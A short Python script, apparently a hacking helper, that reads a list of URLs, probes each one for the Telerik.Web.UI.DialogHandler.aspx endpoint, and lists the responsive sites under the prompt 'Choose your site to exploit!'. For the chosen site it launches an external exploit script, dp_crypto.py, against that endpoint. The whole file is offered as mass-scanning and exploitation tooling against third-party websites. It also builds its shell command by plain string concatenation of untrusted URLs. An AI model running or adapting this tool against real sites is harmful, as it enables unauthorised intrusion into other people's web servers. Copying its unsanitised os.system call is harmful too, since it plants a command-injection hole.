import requests
import os

print("Program is running to detect website - Module is made by HK!")
UrlListFile = open("lists.txt", "r")
UrlListRead = UrlListFile.read()
UrlListFile.close()
listSplit = UrlListRead.splitlines()
checktelerik = '/Telerik.Web.UI.DialogHandler.aspx'
listurl = []
for url in listSplit:
    response = requests.get(url + checktelerik)
    if response.status_code == 200:
        listurl.append(url)
print("Choose your site to exploit!")
print("Input q or e to exit")

i = 0
for x in listurl:
    #  print(x)
    i = i + 1
    print(str(i) + "." + x)

choice = input("Enter your choice: \n")
if (choice == 'q' or choice == 'e'):
    exit()
else:
    print(listurl[int(choice) - 1])
os.system('python3 dp_crypto.py -k ' + listurl[int(choice) - 1] + checktelerik + ' 128 all 21')
